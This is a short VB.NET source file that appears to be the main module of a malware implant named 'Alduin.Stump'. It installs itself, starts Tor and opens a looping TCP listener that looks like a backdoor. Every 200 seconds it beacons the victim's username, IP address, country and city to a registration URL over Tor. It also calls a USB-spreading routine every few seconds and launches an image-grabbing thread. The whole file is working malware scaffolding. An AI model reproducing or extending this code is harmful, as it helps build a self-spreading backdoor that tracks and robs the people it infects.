Imports System.IO
Imports System.Threading
Imports Alduin.Stump.Alduin.Stump.Class.Network

Module Main
    ReadOnly NewListener As New Thread(AddressOf Listener)
    ReadOnly NewNotice As New Thread(AddressOf Noticer)
    ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
    ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
    Sub Main()
        Install()
        StartTor()

        NewListener.Start()
        NewNotice.Start()
        DelayedAction.Start()
        If Not File.Exists(GetLocal_path() & "\Images.txt") Then
            NewImageGraber.Start()
        End If
    End Sub
    Public Sub Listener()
        Console.WriteLine("Listening") 'Debugging
        Dim tcplistener As New TcpListen
        While (True)
            tcplistener.TcpAsync()
        End While
    End Sub
    Public Sub Noticer()
        While (True)
            Dim model As New DefaultRegistrationModel With {
                .Username = GetUsername(),
                .Address = GetOnionAddress(),
                .LastIPAddress = GetMyIPAddress(),
                .CountryCode = GetCountyCode(GetMyIPAddress()),
                .City = GetCity(GetMyIPAddress()),
                .KeyUnique = GetConfigJson().KeyUnique,
                .KeyCertified = SavedKeyCertified,
                .Domain = GetOnionAddress()
            }
            Dim http As New SendHTTPonTor
            http.TalkChannelHTTP(model.ToString, RegistrationUrl)
            Thread.Sleep(SectoMs(200))
        End While
    End Sub
    Public Sub DelayedActions()
        While (True)
            USBSpreading(GetMainFile())
            Thread.Sleep(SectoMs(5))
        End While
    End Sub
End Module
